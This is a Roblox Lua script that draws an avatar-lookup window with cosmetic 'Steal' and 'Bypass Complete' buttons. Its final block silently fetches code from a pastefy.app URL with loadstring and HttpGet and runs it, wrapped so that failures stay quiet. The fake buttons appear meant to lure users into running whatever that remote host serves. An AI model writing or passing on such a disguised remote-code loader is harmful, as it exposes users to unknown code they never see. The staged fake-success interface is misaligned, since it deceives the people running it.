local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create GUI Elements
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AvatarGui"
screenGui.Parent = playerGui

-- Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- Title
local title = Instance.new("TextLabel")
title.Text = "Enter username"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.Parent = frame

-- Username Input
local usernameBox = Instance.new("TextBox")
usernameBox.Name = "UsernameBox"
usernameBox.PlaceholderText = "Type Roblox username..."
usernameBox.Size = UDim2.new(1, -20, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 50)
usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameBox.Font = Enum.Font.Gotham
usernameBox.TextSize = 18
usernameBox.ClearTextOnFocus = false
usernameBox.Parent = frame

-- Avatar Image
local avatarImage = Instance.new("ImageLabel")
avatarImage.Name = "AvatarImage"
avatarImage.Size = UDim2.new(0, 100, 0, 100)
avatarImage.Position = UDim2.new(0.5, -50, 0, 100)
avatarImage.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
avatarImage.Parent = frame

-- Red Button (Steal - cosmetic only)
local stealButton = Instance.new("TextButton")
stealButton.Size = UDim2.new(1, -20, 0, 40)
stealButton.Position = UDim2.new(0, 10, 0, 220)
stealButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stealButton.Font = Enum.Font.GothamBold
stealButton.TextScaled = true
stealButton.Text = "Steal"
stealButton.Parent = frame

-- Green Button (Bypass Complete - cosmetic only)
local bypassButton = Instance.new("TextButton")
bypassButton.Size = UDim2.new(1, -20, 0, 40)
bypassButton.Position = UDim2.new(0, 10, 0, 270)
bypassButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
bypassButton.TextColor3 = Color3.fromRGB(255, 255, 255)
bypassButton.Font = Enum.Font.GothamBold
bypassButton.TextScaled = true
bypassButton.Text = "Bypass Complete"
bypassButton.Parent = frame

-- Function: Fetch Avatar
local function updateAvatar(username)
	if username == "" then
		avatarImage.Image = ""
		return
	end
	
	local Players = game:GetService("Players")
	local success, userId = pcall(function()
		return Players:GetUserIdFromNameAsync(username)
	end)
	
	if success and userId then
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size100x100
		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
		if isReady then
			avatarImage.Image = content
		end
	else
		avatarImage.Image = "" -- Clear if not found
	end
end

-- Detect Username Change
usernameBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		updateAvatar(usernameBox.Text)
	end
end)

-- Run your external loadstring script
local success, err = pcall(function()
	loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
end)
if not success then
	warn("Failed to load external script:", err)
end
